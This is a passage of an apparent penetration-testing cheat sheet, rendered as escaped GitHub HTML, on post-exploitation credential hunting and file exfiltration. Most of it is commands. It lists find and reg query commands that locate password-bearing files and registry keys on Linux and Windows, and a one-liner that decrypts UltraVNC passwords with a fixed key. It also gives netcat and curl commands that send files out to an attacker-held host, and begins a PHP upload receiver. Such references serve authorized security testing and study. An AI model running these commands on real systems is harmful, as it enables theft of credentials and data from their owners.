-xdev -type f -readable -path \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e*/.docker/*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -name config.json -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e GNUPG directory\u003c/span\u003e\nfind / -xdev -type d -readable -name \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e.gnupg\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Confluence config has credentials\u003c/span\u003e\nfind / -xdev -type f -readable -name confluence.cfg.xml -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e normally at:\u003c/span\u003e\n/var/atlassian/application-data/confluence/confluence.cfg.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e VNC passwd files have creds\u003c/span\u003e\nfind / -xdev -type f -path \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e*/.*vnc/*\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -name passwd -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e rarely, .profile files have sensitive info\u003c/span\u003e\nfind / -xdev -type f -readable -name \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e.*profile\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.1.2 Sensitive Files on Windows\u003c/h3\u003e\u003ca id=\"user-content-712-sensitive-files-on-windows\" class=\"anchor\" aria-label=\"Permalink: 7.1.2 Sensitive Files on Windows\" href=\"#712-sensitive-files-on-windows\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlso check out:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"#5.8%20Windows%20Passwords%20\u0026amp;%20Hashes\"\u003eWindows Passwords \u0026amp; Hashes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#5.11%20Windows%20Files%20of%20Interest\"\u003eWindows Files of Interest\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# SAM\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n\n# Unattend install files: plaintext or base64 encoded password\nC:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n\n# IIS, web.config can contain admin creds\nC:\\inetpub\\wwwroot\\web.config\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config\n\n# Groups.xml: encrypted password, but key is available online in many tools\nC:\\ProgramData\\Microsoft\\Group Policy\\History\\????\\Machine\\Preferences\\Groups\\Groups.xml\n\\\\????\\SYSVOL\\\\Policies\\????\\MACHINE\\Preferences\\Groups\\Groups.xml\n\n# The 'cpassword' attribute found in many files\nServices\\Services.xml\nScheduledTasks\\ScheduledTasks.xml\nPrinters\\Printers.xml\nDrives\\Drives.xml\nDataSources\\DataSources.xml\n\n# Windows Autologin credentials\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\n\n# SNMP credentials\nreg query HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\n\n# McAfee password stored in SiteList.xml\n%AllUsersProfile%\\Application Data\\McAfee\\Common Framework\\SiteList.xml\n\n# Putty proxy creds\nreg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\n\n# UltraVNC encrypted password\ndir /b /s *vnc.ini\nC:\\Program Files\\UltraVNC\\ultravnc.ini\n# decrypt with:\n# echo -n ULTRAVNC_PW_HASH | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv\n# or:\n# https://github.com/trinitronx/vncpasswd.py\n# or:\n# msfconsole\n# \u0026gt; irb\n# \u0026gt; fixedkey = \u0026quot;\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\u0026quot;\n# \u0026gt; require 'rex/proto/rfb'\n# \u0026gt; Rex::Proto::RFB::Cipher.decrypt [\u0026quot;YOUR ENCRYPTED VNC PASSWORD HERE\u0026quot;].pack('H*'), fixedkey\n\n# RealVNC hashed password in registry:\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver /v password\n\n# TightVNC\nreg query HKEY_CURRENT_USER\\Software\\TightVNC\\Server /s\nreg query HKLM\\SOFTWARE\\TightVNC\\Server\\ControlPassword /s\ntightvnc.ini\nvnc_viewer.ini\n\n# TigerVNC\nreg query HKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4 /v password\n\n# Search registry for password\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SAM\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMROOT\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\repair\\SAM\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMROOT\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\System32\\config\\RegBack\\SAM\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eSYSTEMROOT\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\System32\\config\\SAM\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Unattend install files: plaintext or base64 encoded password\u003c/span\u003e\nC:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e IIS, web.config can contain admin creds\u003c/span\u003e\nC:\\inetpub\\wwwroot\\web.config\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.\u003cspan class=\"pl-c1\"\u003e0.30319\u003c/span\u003e\\Config\\web.config\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Groups.xml: encrypted password, but key is available online in many tools\u003c/span\u003e\nC:\\ProgramData\\Microsoft\\Group Policy\\History\\\u003cspan class=\"pl-k\"\u003e????\u003c/span\u003e\\Machine\\Preferences\\Groups\\Groups.xml\n\\\\\u003cspan class=\"pl-k\"\u003e????\u003c/span\u003e\\SYSVOL\\\\Policies\\\u003cspan class=\"pl-k\"\u003e????\u003c/span\u003e\\MACHINE\\Preferences\\Groups\\Groups.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e The 'cpassword' attribute found in many files\u003c/span\u003e\nServices\\Services.xml\nScheduledTasks\\ScheduledTasks.xml\nPrinters\\Printers.xml\nDrives\\Drives.xml\nDataSources\\DataSources.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Windows Autologin credentials\u003c/span\u003e\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e SNMP credentials\u003c/span\u003e\nreg query HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e McAfee password stored in SiteList.xml\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003eAllUsersProfile\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e\\Application \u003cspan class=\"pl-k\"\u003eData\u003c/span\u003e\\McAfee\\Common Framework\\SiteList.xml\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Putty proxy creds\u003c/span\u003e\nreg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e UltraVNC encrypted password\u003c/span\u003e\ndir \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eb \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003evnc.ini\nC:\\Program Files\\UltraVNC\\ultravnc.ini\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e decrypt with:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e echo -n ULTRAVNC_PW_HASH | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://github.com/trinitronx/vncpasswd.py\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e msfconsole\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \u0026gt; irb\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \u0026gt; fixedkey = \"\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\"\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \u0026gt; require 'rex/proto/rfb'\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \u0026gt; Rex::Proto::RFB::Cipher.decrypt [\"YOUR ENCRYPTED VNC PASSWORD HERE\"].pack('H*'), fixedkey\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e RealVNC hashed password in registry:\u003c/span\u003e\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev password\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev password\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e TightVNC\u003c/span\u003e\nreg query HKEY_CURRENT_USER\\Software\\TightVNC\\Server \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\nreg query HKLM\\SOFTWARE\\TightVNC\\Server\\ControlPassword \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\ntightvnc.ini\nvnc_viewer.ini\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e TigerVNC\u003c/span\u003e\nreg query HKEY_LOCAL_USER\\Software\\TigerVNC\\WinVNC4 \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev password\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Search registry for password\u003c/span\u003e\nreg query HKLM \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef password \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_SZ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\nreg query HKCU \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef password \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_SZ \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003es\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMore Windows IIS log and config paths \u003ca href=\"https://techcommunity.microsoft.com/t5/iis-support-blog/collect-basics-configuration-and-logs-when-troubleshooting-iis/ba-p/830927\" rel=\"nofollow\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.1.3 Sensitive Files - Generic\u003c/h3\u003e\u003ca id=\"user-content-713-sensitive-files---generic\" class=\"anchor\" aria-label=\"Permalink: 7.1.3 Sensitive Files - Generic\" href=\"#713-sensitive-files---generic\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"*.kdbx # KeePass database\nGet-ChildItem -Path C:\\ -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.kdbx \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e KeePass database\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ChildItem\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePath C:\\ \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eFile \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eRecurse \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eErrorAction SilentlyContinue \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eInclude \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.kdbx\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.1.3.1 git repos\u003c/h4\u003e\u003ca id=\"user-content-7131-git-repos\" class=\"anchor\" aria-label=\"Permalink: 7.1.3.1 git repos\" href=\"#7131-git-repos\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSometimes git repos contain sensitive info in the git history.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# view commit history\ngit log\n\n# show changes for a commit\ngit show COMMIT_HASH\n\n# search for sensitive keywords in current checkout\ngit grep -i password\n\n# search for sensitive keywords in file content of entire commit history\ngit grep -i password $(git rev-list --all)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view commit history\u003c/span\u003e\ngit log\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show changes for a commit\u003c/span\u003e\ngit show COMMIT_HASH\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e search for sensitive keywords in current checkout\u003c/span\u003e\ngit grep -i password\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e search for sensitive keywords in file content of entire commit history\u003c/span\u003e\ngit grep -i password \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003egit rev-list --all\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2 File Transfers\u003c/h2\u003e\u003ca id=\"user-content-72-file-transfers\" class=\"anchor\" aria-label=\"Permalink: 7.2 File Transfers\" href=\"#72-file-transfers\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eGreat resource\u003c/strong\u003e: \u003ca href=\"https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration\" rel=\"nofollow\"\u003eHackTricks - Exfiltration\u003c/a\u003e   \u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.1 Netcat transfer\u003c/h3\u003e\u003ca id=\"user-content-721-netcat-transfer\" class=\"anchor\" aria-label=\"Permalink: 7.2.1 Netcat transfer\" href=\"#721-netcat-transfer\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# start listening for download on port 9001\nnc -nlvp 9001 \u0026gt; dump.txt\n# upload file to IP via port 9001\nnc $IP 9001 \u0026lt; file.txt\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start listening for download on port 9001\u003c/span\u003e\nnc -nlvp 9001 \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e dump.txt\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e upload file to IP via port 9001\u003c/span\u003e\nnc \u003cspan class=\"pl-smi\"\u003e$IP\u003c/span\u003e 9001 \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003e file.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.2 Curl transfers\u003c/h3\u003e\u003ca id=\"user-content-722-curl-transfers\" class=\"anchor\" aria-label=\"Permalink: 7.2.2 Curl transfers\" href=\"#722-curl-transfers\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# upload a file with curl (POST multipart/form-data)\n# replace key1, upload with appropriate form fields\ncurl -v -F key1=value1 -F upload=@localfilename URL\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e upload a file with curl (POST multipart/form-data)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e replace key1, upload with appropriate form fields\u003c/span\u003e\ncurl -v -F key1=value1 -F upload=@localfilename URL\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.3 PHP File Uploads\u003c/h3\u003e\u003ca id=\"user-content-723-php-file-uploads\" class=\"anchor\" aria-label=\"Permalink: 7.2.3 PHP File Uploads\" href=\"#723-php-file-uploads\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUploading files via HTTP POST to \u003ccode\u003eupload.php\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-php notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?php\n// File: upload.php\n// start php server from same directory as this file:\n// mkdir -p ../uploads \u0026amp;\u0026amp; sudo php -S 0.0.0.0:80\n  $parentdir = dirname(dirname(__FILE__));\n  $uploaddir = $parentdir . '/uploads/';\n  $filename = basename($_FILES['file']['name']);\n  $uploadfile = $uploaddir . $filename;\n  move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)\n?\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e// File: upload.php\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e// start php server from same directory as this file:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e// mkdir -p ../uploads \u0026amp;\u0026amp; sudo php -S 0.0.0.0:80\u003c/span\u003e\n  \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eparentdir\u003c/span\u003e = \u003cspan class=\"pl-en\"\u003edirname\u003c/span\u003e(\u003cspan class=\"pl-en\"\u003edirname\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e__FILE__\u003c/span\u003e));\n  \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003euploaddir\u003c/span\u003e = \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003eparentdir\u003c/span\u003e . \u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003e/uploads/\u003c/span\u003e'\u003c/span\u003e;\n  \u003cspan class=\"pl-s1\"\u003e\u003cspan 